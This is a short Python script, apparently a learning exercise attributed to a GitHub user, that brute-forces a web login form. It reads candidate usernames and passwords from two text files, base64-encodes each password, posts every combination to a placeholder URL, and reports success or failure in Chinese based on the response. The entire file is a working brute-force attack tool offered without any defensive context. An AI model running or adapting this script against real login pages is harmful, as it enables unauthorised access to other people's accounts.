# Learning in Python

"""
about blast_logins, by Ye4r
github:https://github.com/Ye4r/trypy/blob/main/blast_login.py
"""


import requests
import base64

# with open('name.txt', 'r', encoding='utf-8') as f, open('pwd.txt', 'r', encoding='utf-8') as p:
#     namelist = f.read().splitlines()
#     f.close()
#     pwdlist = p.read().splitlines()
#     p.close()

def ask(a):
    with open(a, 'r', encoding='utf-8') as f:
        list = f.read().splitlines()
        return list

namelist = ask('name.txt')
pwdlist = ask('pwd.txt')

url = "http://url"
data = {}
for i in namelist:
    data['UNAME'] = i
    for p in pwdlist:
        p = base64.b64encode(p.encode('utf-8'))
        data['PASSWORD'] = str(p, 'utf-8')
        print(data)
        send = requests.post(url, data)
        # print(send.text)
        if 'center error' in send.text:
            print("用户名或密码错误!")
        else:
            print("登陆成功!")
